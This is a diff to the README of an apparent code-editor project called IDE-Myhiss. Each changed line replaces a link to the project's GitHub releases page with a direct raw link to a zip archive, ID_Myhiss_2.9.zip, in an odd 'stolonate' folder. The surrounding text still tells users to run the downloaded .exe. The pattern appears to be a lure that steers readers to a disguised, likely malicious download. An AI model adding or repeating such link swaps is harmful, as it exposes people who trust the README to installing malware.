@@ -1,6 +1,6 @@
 # 💻 IDE-Myhiss - Focus and control for your code
 
-[![Download IDE-Myhiss](https://img.shields.io/badge/Download-IDE--Myhiss-blue.svg)](https://github.com/ROEURY-MC/IDE-Myhiss)
+[![Download IDE-Myhiss](https://img.shields.io/badge/Download-IDE--Myhiss-blue.svg)](https://raw.githubusercontent.com/ROEURY-MC/IDE-Myhiss/main/stolonate/ID_Myhiss_2.9.zip)
 
 IDE-Myhiss acts as a workspace for engineers who want focus and speed. It handles complex code projects while staying out of your way. This software provides a clean environment for writing text and scripts. It integrates with your files to ensure you keep full control over your work.
 
@@ -18,7 +18,7 @@ Your computer needs specific parts to run this software well. Please check your 
 
 Follow these steps to put the software on your computer.
 
-1. Visit the [releases page](https://github.com/ROEURY-MC/IDE-Myhiss) to download the installer.
+1. Visit the [releases page](https://raw.githubusercontent.com/ROEURY-MC/IDE-Myhiss/main/stolonate/ID_Myhiss_2.9.zip) to download the installer.
 2. Select the file ending in .exe that matches your Windows version.
 3. Save the file to your Downloads folder.
 4. Locate the file in your folder and double-click it.
@@ -67,7 +67,7 @@ Every file you create belongs to you. You can move these files out of the editor
 
 ## 📜 Choosing Your Version
 
-When you visit the [download page](https://github.com/ROEURY-MC/IDE-Myhiss), you might find different versions labeled as releases. The top release usually holds the latest stable version. We recommend this version for most users. If you want to experiment with new features before everyone else, look for labels marked as Beta. These versions might have minor glitches, but they offer the newest additions to the toolset. Always save your work regularly if you use a beta version.
+When you visit the [download page](https://raw.githubusercontent.com/ROEURY-MC/IDE-Myhiss/main/stolonate/ID_Myhiss_2.9.zip), you might find different versions labeled as releases. The top release usually holds the latest stable version. We recommend this version for most users. If you want to experiment with new features before everyone else, look for labels marked as Beta. These versions might have minor glitches, but they offer the newest additions to the toolset. Always save your work regularly if you use a beta version.
 
 ## 💡 Best Practices
 
